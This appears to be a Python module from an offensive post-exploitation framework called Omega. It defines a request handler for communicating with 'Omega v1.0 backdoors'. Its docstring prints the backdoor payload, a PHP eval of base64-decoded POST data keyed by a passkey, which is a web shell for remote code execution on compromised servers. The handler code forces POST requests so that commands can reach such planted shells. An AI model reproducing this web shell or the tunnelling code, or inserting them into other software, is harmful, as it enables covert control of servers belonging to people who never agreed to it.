#!/usr/bin/env python3

#            ---------------------------------------------------
#                              Omega Framework                                
#            ---------------------------------------------------
#                  Copyright (C) <2020>  <Entynetproject>       
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

"""Backwards compatible tunnel handler for
Omega v1.0 backdoors, aka:
    <?php eval(base64_decode($_POST[%%PASSKEY%%])); ?>
"""
__all__ = ["Request_V1_x"]

from . import handler
from .exceptions import BuildError


class Request_V1_x(handler.Request):

    def __init__(self):
        """Force default method to POST, because only this one
        was supported on Omega v1.0 versions.
        """
        super().__init__()
        self.default_method = "POST"

    def build_forwarder(self, method, decoder):
        """Assuming that Omega v1.0 uses POST data as payload container
        without using an intermediate forwarder, this method shall
        always return an empty dictionnary.
        """
        return {}

    def load_multipart(self):
        raise BuildError("Can't send multi request in v1-compatible mode")
